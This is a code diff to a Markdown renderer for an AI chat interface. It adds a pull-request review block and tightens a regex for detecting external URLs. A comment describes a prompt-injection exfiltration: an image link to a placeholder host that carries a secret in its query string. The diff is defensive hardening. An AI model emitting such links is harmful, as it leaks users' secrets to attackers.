@@ -12,6 +12,8 @@ import { FILE_HREF, fileHrefPath } from '@/features/files/viewerStore'
 // ```git blocks: the live graph of a repository (features/git), loaded the first time one shows up.
 const GitBlock = React.lazy(withGroups(['git'], () => import('@/features/git/GitBlock')))
 const InfraBlock = React.lazy(withGroups(['infra'], () => import('@/features/infra/InfraBlock')))
+// ```pr-review blocks: a review Claude wrote for a pull request, published on GitHub by the user's click
+const PrReviewBlock = React.lazy(withGroups(['code'], () => import('@/features/code/PrReviewBlock')))
 
 // Syntax highlighting (grammars in ./highlight, a separate chunk): code blocks render plain until the first one with
 // a language loads it, then every mounted Markdown re-renders highlighted. Unknown languages render as plain code.
@@ -71,8 +73,9 @@ function textOf(node: React.ReactNode): string {
 }
 
 const SAFE_URL = /^(https?:|mailto:|\/|#|\.{0,2}\/)/i
-/** Off this site: `https://…` and protocol-relative `//host/…`. */
-const EXTERNAL = /^(https?:)?\/\//i
+/** Off this site: `https://…` and protocol-relative `//host/…` - browsers also read `/\host` (a backslash, tabs or
+ * line breaks between the two) as `//host`. */
+const EXTERNAL = /^(https?:)?[\t\n\r]*[\\/][\t\n\r]*[\\/]/i
 
 /** A remote picture loads only on a click: an answer that embeds `![](https://host/?d=<secret>)` (a prompt injection
  * in a page Claude read) would otherwise send it the moment the message shows. Pictures of this site load at once. */
@@ -167,6 +170,14 @@ export const Markdown = React.memo(function Markdown({ children, className, onLi
             </React.Suspense>
           )
         }
+        if (lang === 'pr-review') {
+          const code = textOf(child?.props?.children).replace(/\n$/, '')
+          return (
+            <React.Suspense fallback={<CodeBlock code={code} className="my-3" />}>
+              <PrReviewBlock code={code} className="my-3" />
+            </React.Suspense>
+          )
+        }
         if (lang === 'infra') {
           const code = textOf(child?.props?.children).replace(/\n$/, '')
           return (
@@ -187,6 +198,15 @@ export const Markdown = React.memo(function Markdown({ children, className, onLi
         if (EXTERNAL.test(s)) return <RemoteImage src={s} alt={alt || ''} />
         const local = localImage ? localImage(s) : s
         return local === null ? <RemoteImage src={s} alt={alt || ''} /> : <img src={local} alt={alt || ''} loading="lazy" />
+      },
+      // A cell that holds a sentence keeps a readable width: on a narrow screen the table scrolls sideways (globals.css)
+      // instead of squeezing the sentence to one word a line.
+      td({ node, children: c, style }) {
+        return (
+          <td style={style} data-long={node && hText(node as unknown as HNode).length > 40 ? '' : undefined}>
+            {c}
+          </td>
+        )
       },
       ...components,
     }),
